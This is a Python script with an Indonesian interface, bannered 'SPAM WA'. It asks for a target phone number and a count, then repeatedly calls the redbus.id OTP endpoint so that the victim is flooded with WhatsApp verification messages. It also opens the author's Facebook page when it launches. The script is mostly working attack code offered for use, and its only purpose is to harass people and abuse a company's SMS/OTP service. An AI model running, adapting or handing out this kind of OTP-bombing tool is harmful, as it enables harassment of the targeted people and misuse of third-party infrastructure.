from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re

def inuganz(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.01)

from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re
def april(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.05)


def clr():
    os.system("clear")

def folow():
    april("\x1b[1;93mFollow Facebook Gw Dulu \x1b[1;94mBiar Work Bang\x1b[1;92m >_<")
    time.sleep(3)
    os.system("xdg-open https://www.facebook.com/profile.php?id=100078919720019")
    clr()
def logo():
    time.sleep(1)
banner = ("""
\x1b[1;94m ┌─────────────────────────────────────────────────────────────────┐
\x1b[1;95m │    ███████╗██████╗  █████╗ ███╗   ███╗    ██╗    ██╗ █████╗     │
\x1b[1;96m │    ██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██║    ██║██╔══██╗    │
\x1b[1;97m │    ███████╗██████╔╝███████║██╔████╔██║    ██║ █╗ ██║███████║    │
\x1b[1;93m │    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██║███╗██║██╔══██║    │
\x1b[1;94m │    ███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚███╔███╔╝██║  ██║    │
\x1b[1;95m │    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══╝╚══╝ ╚═╝  ╚═╝    │
\x1b[1;96m └─────────────────────────────────────────────────────────────────┘

    \t \x1b[1;92m[+] Author   : @Xenz
    \t \x1b[1;92m[+] Github   : github.com/Xenz-11
    \t \x1b[1;92m[+] Whatsaap : +6283138613993
    \t        \x1b[1;90mBy : InuGanz
    \t           \x1b[1;90mFb : Xenz Why""")
def scrip():
    time.sleep(1)
    inuganz(banner)
    print ("")
    april("\x1b[1;94mGunakan awalan 8xxx")
    print ("\x1b[1;93m")
    nomor = input("[+] Masukan Nomer Target Bang  ~> ")
    jumlah = int(input("[+] Masukan Jumlah Spam ~> "))
    april("\x1b[1;95mKALO DAH LIMIT TUNGGU BEBERAPA MENIT YA")
    time.sleep(2)
    ua = {
    'Host':' m.redbus.id',
    'user-agent':' Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36',
    'sec-ch-ua-platform':' "Android"',
    'accept':' */*',
    'sec-fetch-site':' same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer':' https://m.redbus.id/',
    'accept-encoding':" gzip, deflate, br",
    'accept-language':" id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
    }

    url = f"https://m.redbus.id/api/getOtp?number={nomor}&cc=62&whatsAppOpted=true&disableOtpFlow=undefined"
    for i in range(jumlah):
          req = requests.get(url,'headers=ua').text
          xenz = json.loads(req)
          xn = xenz["Code"]
          xx = xenz["Message"]
          april(f"\x1b[1;92mCode: {xn}, Message: {xx}")
def lagi():
    lagi = input("Lagi Gak Bang [y/t] : ")
    if lagi == "y":
       clr()
       logo()
       scrip()
    if lagi == "t":
        april("\x1b[1;94mOke Bang Bye")
        april("\x1b[1;93mMakasih Dah Pake Sc Gw :)")
        time.sleep(2)
        sys.exit
        clr()

clr()
folow()
logo()
scrip()
lagi()